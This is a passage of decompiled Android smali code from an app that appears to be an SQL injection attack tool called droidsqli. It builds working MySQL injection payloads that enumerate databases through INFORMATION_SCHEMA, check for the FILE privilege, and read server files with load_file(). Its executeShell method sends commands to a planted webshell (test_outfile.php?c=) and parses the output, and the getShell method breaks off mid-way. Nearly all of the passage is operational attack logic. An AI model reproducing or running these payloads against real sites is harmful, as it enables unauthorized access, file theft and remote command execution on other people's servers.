    if-ne v1, v3, :cond_0

    .line 525
    const-string v1, "Entrada duplicada \'1\' para la clave "

    invoke-virtual {v0, v1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v1

    if-ne v1, v3, :cond_0

    .line 526
    const-string v1, "Cimpul \'1\' e duplicat pentru cheia "

    invoke-virtual {v0, v1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v1

    if-ne v1, v3, :cond_0

    .line 527
    const-string v1, "Dubbele ingang \'1\' voor zoeksleutel "

    invoke-virtual {v0, v1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v1

    if-ne v1, v3, :cond_0

    .line 528
    const-string v1, "Valore duplicato \'1\' per la chiave "

    invoke-virtual {v0, v1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v1

    if-ne v1, v3, :cond_0

    .line 530
    const-string v1, "Dupliran unos \'1\' za klju"

    invoke-virtual {v0, v1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v1

    if-ne v1, v3, :cond_0

    .line 531
    const-string v1, "Entrada \'1\' duplicada para a chave "

    invoke-virtual {v0, v1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v1

    if-ne v1, v3, :cond_0

    .line 514
    const/4 v1, 0x0

    :goto_0
    return v1

    :cond_0
    const/4 v1, 0x1

    goto :goto_0
.end method

.method private isTimeBasedInjectable()Z
    .locals 1
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Lnet/edgard/droidsqli/exception/PreparationException;
        }
    .end annotation

    .prologue
    .line 550
    new-instance v0, Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection;

    invoke-direct {v0, p0}, Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection;-><init>(Lnet/edgard/droidsqli/mvc/model/InjectionModel;)V

    iput-object v0, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->timeModel:Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection;

    .line 551
    iget-object v0, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->timeModel:Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection;

    invoke-virtual {v0}, Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection;->isTimeInjectable()Z

    move-result v0

    return v0
.end method

.method private listDatabases()V
    .locals 14
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Lnet/edgard/droidsqli/exception/PreparationException;,
            Lnet/edgard/droidsqli/exception/StoppableException;
        }
    .end annotation

    .prologue
    const/4 v13, 0x2

    const/4 v12, 0x1

    const/4 v11, 0x0

    .line 603
    new-array v5, v12, [Ljava/lang/String;

    const-string v7, ""

    aput-object v7, v5, v11

    .line 604
    .local v5, "sourcePage":[Ljava/lang/String;
    new-instance v7, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_loopIntoResults;

    invoke-direct {v7, p0, p0}, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_loopIntoResults;-><init>(Lnet/edgard/droidsqli/mvc/model/InjectionModel;Lnet/edgard/droidsqli/mvc/model/InjectionModel;)V

    const/4 v8, 0x5

    new-array v8, v8, [Ljava/lang/Object;

    .line 605
    const-string v9, "select+concat(group_concat(0x6868,r,0x6a6a,hex(cast(q+as+char)),0x6868+order+by+r+separator+0x6767),0x69)from(select+hex(cast(TABLE_SCHEMA+as+char))r,count(TABLE_NAME)q+from+INFORMATION_SCHEMA.tables+group+by+r{limit})x"

    aput-object v9, v8, v11

    .line 626
    aput-object v5, v8, v12

    .line 627
    invoke-static {v12}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v9

    aput-object v9, v8, v13

    const/4 v9, 0x3

    .line 628
    invoke-static {v11}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v10

    aput-object v10, v8, v9

    const/4 v9, 0x4

    .line 629
    const/4 v10, 0x0

    aput-object v10, v8, v9

    .line 604
    invoke-virtual {v7, v8}, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_loopIntoResults;->action([Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    .line 633
    .local v2, "hexResult":Ljava/lang/String;
    const-string v7, "hh([0-9A-F]*)jj([0-9A-F]*)(c)?hh"

    const/16 v8, 0x22

    invoke-static {v7, v8}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;I)Ljava/util/regex/Pattern;

    move-result-object v7

    invoke-virtual {v7, v2}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v4

    .line 635
    .local v4, "regexSearch":Ljava/util/regex/Matcher;
    invoke-virtual {v4}, Ljava/util/regex/Matcher;->find()Z

    move-result v7

    if-nez v7, :cond_0

    .line 636
    const-string v7, "Fetching databases fails"

    aget-object v8, v5, v11

    invoke-virtual {v8}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {p0, v7, v8}, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->sendResponseFromSite(Ljava/lang/String;Ljava/lang/String;)V

    .line 637
    new-instance v7, Lnet/edgard/droidsqli/exception/PreparationException;

    invoke-direct {v7}, Lnet/edgard/droidsqli/exception/PreparationException;-><init>()V

    throw v7

    .line 639
    :cond_0
    invoke-virtual {v4}, Ljava/util/regex/Matcher;->reset()Ljava/util/regex/Matcher;

    .line 642
    new-instance v1, Ljava/util/ArrayList;

    invoke-direct {v1}, Ljava/util/ArrayList;-><init>()V

    .line 643
    .local v1, "databases":Ljava/util/List;, "Ljava/util/List<Lnet/edgard/droidsqli/mvc/model/database/Database;>;"
    :goto_0
    invoke-virtual {v4}, Ljava/util/regex/Matcher;->find()Z

    move-result v7

    if-nez v7, :cond_1

    .line 652
    new-instance v7, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;

    const-string v8, "add-databases"

    invoke-direct {v7, p0, v8, v1}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;-><init>(Lnet/edgard/droidsqli/mvc/model/ModelObservable;Ljava/lang/String;Ljava/lang/Object;)V

    invoke-virtual {v7}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;->run()V

    .line 653
    return-void

    .line 644
    :cond_1
    invoke-virtual {v4, v12}, Ljava/util/regex/Matcher;->group(I)Ljava/lang/String;

    move-result-object v7

    invoke-static {v7}, Lnet/edgard/droidsqli/tool/StringTool;->hexstr(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 645
    .local v0, "databaseName":Ljava/lang/String;
    invoke-virtual {v4, v13}, Ljava/util/regex/Matcher;->group(I)Ljava/lang/String;

    move-result-object v7

    invoke-static {v7}, Lnet/edgard/droidsqli/tool/StringTool;->hexstr(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    .line 647
    .local v6, "tableCount":Ljava/lang/String;
    new-instance v3, Lnet/edgard/droidsqli/mvc/model/database/Database;

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-static {v6}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v8

    invoke-direct {v7, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-direct {v3, v0, v7}, Lnet/edgard/droidsqli/mvc/model/database/Database;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    .line 648
    .local v3, "newDatabase":Lnet/edgard/droidsqli/mvc/model/database/Database;
    invoke-interface {v1, v3}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    goto :goto_0
.end method


# virtual methods
.method public executeShell(Ljava/lang/String;Ljava/lang/String;Ljava/util/UUID;Ljava/lang/String;)V
    .locals 11
    .param p1, "path"    # Ljava/lang/String;
    .param p2, "cmd"    # Ljava/lang/String;
    .param p3, "l"    # Ljava/util/UUID;
    .param p4, "wbhPath"    # Ljava/lang/String;

    .prologue
    .line 664
    :try_start_0
    new-instance v6, Ljava/net/URL;

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-static {p4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v8

    invoke-direct {v7, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v8, "test_outfile.php?c="

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    const-string v8, " "

    const-string v9, "+"

    invoke-virtual {p2, v8, v9}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-direct {v6, v7}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    invoke-virtual {v6}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v0

    .line 665
    .local v0, "con":Ljava/net/URLConnection;
    const v6, 0xea60

    invoke-virtual {v0, v6}, Ljava/net/URLConnection;->setReadTimeout(I)V

    .line 666
    const v6, 0xea60

    invoke-virtual {v0, v6}, Ljava/net/URLConnection;->setConnectTimeout(I)V

    .line 668
    new-instance v4, Ljava/io/BufferedReader;

    new-instance v6, Ljava/io/InputStreamReader;

    invoke-virtual {v0}, Ljava/net/URLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object v7

    invoke-direct {v6, v7}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    invoke-direct {v4, v6}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 669
    .local v4, "reader":Ljava/io/BufferedReader;
    const-string v3, ""

    .line 670
    .local v3, "pageSource":Ljava/lang/String;
    :goto_0
    invoke-virtual {v4}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v2

    .local v2, "line":Ljava/lang/String;
    if-nez v2, :cond_0

    .line 671
    invoke-virtual {v4}, Ljava/io/BufferedReader;->close()V

    .line 673
    const-string v6, "<SQLi>(.*)<iLQS>"

    const/16 v7, 0x20

    invoke-static {v6, v7}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;I)Ljava/util/regex/Pattern;

    move-result-object v6

    invoke-virtual {v6, v3}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v5

    .line 674
    .local v5, "regexSearch":Ljava/util/regex/Matcher;
    invoke-virtual {v5}, Ljava/util/regex/Matcher;->find()Z

    .line 676
    new-instance v6, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;

    const-string v7, "add-shell-cmd"

    const/4 v8, 0x2

    new-array v8, v8, [Ljava/lang/Object;

    const/4 v9, 0x0

    aput-object p3, v8, v9

    const/4 v9, 0x1

    const/4 v10, 0x1

    invoke-virtual {v5, v10}, Ljava/util/regex/Matcher;->group(I)Ljava/lang/String;

    move-result-object v10

    aput-object v10, v8, v9

    invoke-direct {v6, p0, v7, v8}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;-><init>(Lnet/edgard/droidsqli/mvc/model/ModelObservable;Ljava/lang/String;Ljava/lang/Object;)V

    invoke-virtual {v6}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;->run()V

    .line 683
    .end local v0    # "con":Ljava/net/URLConnection;
    .end local v2    # "line":Ljava/lang/String;
    .end local v3    # "pageSource":Ljava/lang/String;
    .end local v4    # "reader":Ljava/io/BufferedReader;
    .end local v5    # "regexSearch":Ljava/util/regex/Matcher;
    :goto_1
    return-void

    .line 670
    .restart local v0    # "con":Ljava/net/URLConnection;
    .restart local v2    # "line":Ljava/lang/String;
    .restart local v3    # "pageSource":Ljava/lang/String;
    .restart local v4    # "reader":Ljava/io/BufferedReader;
    :cond_0
    new-instance v6, Ljava/lang/StringBuilder;

    invoke-static {v3}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v7

    invoke-direct {v6, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v6, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, "\n"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    :try_end_0
    .catch Ljava/net/MalformedURLException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1

    move-result-object v3

    goto :goto_0

    .line 677
    .end local v0    # "con":Ljava/net/URLConnection;
    .end local v2    # "line":Ljava/lang/String;
    .end local v3    # "pageSource":Ljava/lang/String;
    .end local v4    # "reader":Ljava/io/BufferedReader;
    :catch_0
    move-exception v1

    .line 678
    .local v1, "e":Ljava/net/MalformedURLException;
    invoke-virtual {v1}, Ljava/net/MalformedURLException;->printStackTrace()V

    goto :goto_1

    .line 679
    .end local v1    # "e":Ljava/net/MalformedURLException;
    :catch_1
    move-exception v1

    .line 680
    .local v1, "e":Ljava/io/IOException;
    invoke-virtual {v1}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_1
.end method

.method public getFile(Ljava/lang/String;)V
    .locals 12
    .param p1, "s"    # Ljava/lang/String;
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Lnet/edgard/droidsqli/exception/PreparationException;,
            Lnet/edgard/droidsqli/exception/StoppableException;
        }
    .end annotation

    .prologue
    const/4 v11, 0x4

    const/4 v10, 0x3

    const/4 v9, 0x2

    const/4 v8, 0x1

    const/4 v7, 0x0

    .line 750
    iget-boolean v3, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->hasFileRight:Z

    if-nez v3, :cond_2

    .line 751
    new-array v2, v8, [Ljava/lang/String;

    const-string v3, ""

    aput-object v3, v2, v7

    .line 753
    .local v2, "sourcePage":[Ljava/lang/String;
    new-instance v3, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_loopIntoResults;

    invoke-direct {v3, p0, p0}, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_loopIntoResults;-><init>(Lnet/edgard/droidsqli/mvc/model/InjectionModel;Lnet/edgard/droidsqli/mvc/model/InjectionModel;)V

    const/4 v4, 0x5

    new-array v4, v4, [Ljava/lang/Object;

    .line 754
    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "concat((select+hex(if(count(*)=1,0x"

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v6, "true"

    invoke-static {v6}, Lnet/edgard/droidsqli/tool/StringTool;->strhex(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, ",0x"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, "false"

    invoke-static {v6}, Lnet/edgard/droidsqli/tool/StringTool;->strhex(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    .line 755
    const-string v6, "))from+INFORMATION_SCHEMA.USER_PRIVILEGES+where+grantee=concat(0x27,replace(cast(current_user+as+char),0x40,0x274027),0x27)and+PRIVILEGE_TYPE=0x46494c45),0x69)"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    .line 754
    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    aput-object v5, v4, v7

    .line 756
    aput-object v2, v4, v8

    .line 757
    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v5

    aput-object v5, v4, v9

    .line 758
    invoke-static {v8}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    aput-object v5, v4, v10

    .line 759
    const/4 v5, 0x0

    aput-object v5, v4, v11

    .line 753
    invoke-virtual {v3, v4}, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_loopIntoResults;->action([Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    .line 761
    .local v1, "hexResult":Ljava/lang/String;
    const-string v3, ""

    invoke-virtual {v1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_0

    .line 762
    const-string v3, "Can\'t read privilege"

    aget-object v4, v2, v7

    invoke-virtual {v4}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {p0, v3, v4}, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->sendResponseFromSite(Ljava/lang/String;Ljava/lang/String;)V

    .line 763
    new-instance v3, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;

    const-string v4, "remove-fileprivilege"

    invoke-direct {v3, p0, v4}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;-><init>(Lnet/edgard/droidsqli/mvc/model/ModelObservable;Ljava/lang/String;)V

    invoke-virtual {v3}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;->run()V

    .line 794
    :goto_0
    return-void

    .line 765
    :cond_0
    invoke-static {v1}, Lnet/edgard/droidsqli/tool/StringTool;->hexstr(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v4, "false"

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_1

    .line 766
    const-string v3, "No FILE privilege"

    invoke-virtual {p0, v3}, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->sendErrorMessage(Ljava/lang/String;)V

    .line 767
    new-instance v3, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;

    const-string v4, "remove-fileprivilege"

    invoke-direct {v3, p0, v4}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;-><init>(Lnet/edgard/droidsqli/mvc/model/ModelObservable;Ljava/lang/String;)V

    invoke-virtual {v3}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;->run()V

    goto :goto_0

    .line 770
    :cond_1
    new-instance v3, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;

    const-string v4, "add-fileprivilege"

    invoke-direct {v3, p0, v4}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;-><init>(Lnet/edgard/droidsqli/mvc/model/ModelObservable;Ljava/lang/String;)V

    invoke-virtual {v3}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;->run()V

    .line 771
    iput-boolean v8, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->hasFileRight:Z

    .line 775
    .end local v1    # "hexResult":Ljava/lang/String;
    .end local v2    # "sourcePage":[Ljava/lang/String;
    :cond_2
    new-array v2, v8, [Ljava/lang/String;

    const-string v3, ""

    aput-object v3, v2, v7

    .line 777
    .restart local v2    # "sourcePage":[Ljava/lang/String;
    new-instance v3, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_loopIntoResults;

    invoke-direct {v3, p0, p0}, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_loopIntoResults;-><init>(Lnet/edgard/droidsqli/mvc/model/InjectionModel;Lnet/edgard/droidsqli/mvc/model/InjectionModel;)V

    const/4 v4, 0x5

    new-array v4, v4, [Ljava/lang/Object;

    .line 778
    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "concat(hex(load_file(0x"

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static {p1}, Lnet/edgard/droidsqli/tool/StringTool;->strhex(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, ")),0x69)"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    aput-object v5, v4, v7

    .line 779
    aput-object v2, v4, v8

    .line 780
    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v5

    aput-object v5, v4, v9

    .line 781
    invoke-static {v8}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    aput-object v5, v4, v10

    .line 782
    const/4 v5, 0x0

    aput-object v5, v4, v11

    .line 777
    invoke-virtual {v3, v4}, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_loopIntoResults;->action([Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    .line 784
    .restart local v1    # "hexResult":Ljava/lang/String;
    const-string v3, ""

    invoke-virtual {v1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_3

    .line 785
    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "Can\'t read file"

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    aget-object v4, v2, v7

    invoke-virtual {v4}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {p0, v3, v4}, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->sendResponseFromSite(Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_0

    .line 789
    :cond_3
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    .line 790
    .local v0, "f":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Ljava/lang/String;>;"
    const/16 v3, 0x2f

    invoke-virtual {p1, v3}, Ljava/lang/String;->lastIndexOf(I)I

    move-result v3

    add-int/lit8 v3, v3, 0x1

    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result v4

    invoke-virtual {p1, v3, v4}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v3}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 791
    invoke-static {v1}, Lnet/edgard/droidsqli/tool/StringTool;->hexstr(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v4, "\r"

    const-string v5, ""

    invoke-virtual {v3, v4, v5}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v3}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 792
    invoke-virtual {v0, p1}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 793
    new-instance v3, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;

    const-string v4, "add-file"

    invoke-direct {v3, p0, v4, v0}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;-><init>(Lnet/edgard/droidsqli/mvc/model/ModelObservable;Ljava/lang/String;Ljava/lang/Object;)V

    invoke-virtual {v3}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;->run()V

    goto/16 :goto_0
.end method

.method public getShell(Ljava/lang/String;Ljava/lang/String;)V
    .locals 13
    .param p1, "s"    # Ljava/lang/String;
    .param p2, "urlToWebshell"    # Ljava/lang/String;
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Lnet/edgard/droidsqli/exception/PreparationException;,
            Lnet/edgard/droidsqli/exception/StoppableException;
        }
    .end annotation

    .prologue
    const/4 v12, 0x3

    const/16 v11, 0x2f

    const/4 v10, 0x2

    const/4 v9, 0x1

    const/4 v8, 0x0

    .line 686
    iget-boolean v3, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->hasFileRight:Z

    if-nez v3, :cond_3

    .line 687
    new-array v2, v9, [Ljava/lang/String;

    const-string v3, ""

    aput-object v3, v2, v8

    .line 689
    .local v2, "sourcePage":[Ljava/lang/String;
    new-instance v3, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_loopIntoResults;

    invoke-direct {v3, p0, p0}, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_loopIntoResults;-><init>(Lnet/edgard/droidsqli/mvc/model/InjectionModel;Lnet/edgard/droidsqli/mvc/model/InjectionModel;)V

    const/4 v4, 0x5

    new-array v4, v4, [Ljava/lang/Object;

    .line 690
    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "concat((select+hex(if(count(*)=1,0x"

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v6, "true"

    invoke-static {v6}, Lnet/edgard/droidsqli/tool/StringTool;->strhex(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, ",0x"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, "false"

    invoke-static {v6}, Lnet/edgard/droidsqli/tool/StringTool;->strhex(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    .line 691
    const-string v6, "))from+INFORMATION_SCHEMA.USER_PRIVILEGES+where+grantee=concat(0x27,replace(cast(current_user+as+char),0x40,0x274027),0x27)and+PRIVILEGE_TYPE=0x46494c45),0x69)"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    .line 690
    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    aput-object v5, v4, v8

    .line 692
    aput-object v2, v4, v9

    .line 693
    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v5

    aput-object v5, v4, v10

    .line 694
    invoke-static {v9}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    aput-object v5, v4, v12

    const/4 v5, 0x4

    .line 695
    const/4 v6, 0x0

    aput-object v6, v4, v5

    .line 689
    invoke-virtual {v3, v4}, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_loopIntoResults;->action([Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    .line 697
    .local v1, "hexResult":Ljava/lang/String;
    const-string v3, ""

    invoke-virtual {v1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_1

    .line 698
    const-string v3, "Can\'t read privilege"

    aget-object v4, v2, v8

    invoke-virtual {v4}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {p0, v3, v4}, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->sendResponseFromSite(Ljava/lang/String;Ljava/lang/String;)V

    .line 699
    new-instance v3, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;

    const-string v4, "remove-fileprivilege"

    invoke-direct {v3, p0, v4}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;-><init>(Lnet/edgard/droidsqli/mvc/model/ModelObservable;Ljava/lang/String;)V

    invoke-virtual {v3}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;->run()V

    .line 745
    :cond_0
    :goto_0
    return-void

    .line 701
    :cond_1
    invoke-static {v1}, Lnet/edgard/droidsqli/tool/StringTool;->hexstr(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v4, "false"

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_2

    .line 702
    const-string v3, "No FILE privilege"

    invoke-virtual {p0, v3}, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->sendErrorMessage(Ljava/lang/String;)V

    .line 703
    new-instance v3, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;

    const-string v4, "remove-fileprivilege"

    invoke-direct {v3, p0, v4}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;-><init>(Lnet/edgard/droidsqli/mvc/model/ModelObservable;Ljava/lang/String;)V

    invoke-virtual {v3}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;->run()V

    goto :goto_0

    .line 706
    :cond_2
    new-instance v3, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;

    const-string v4, "add-fileprivilege"

    invoke-direct {v3, p0, v4}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;-><init>(Lnet/edgard/droidsqli/mvc/model/ModelObservable;Ljava/lang/String;)V

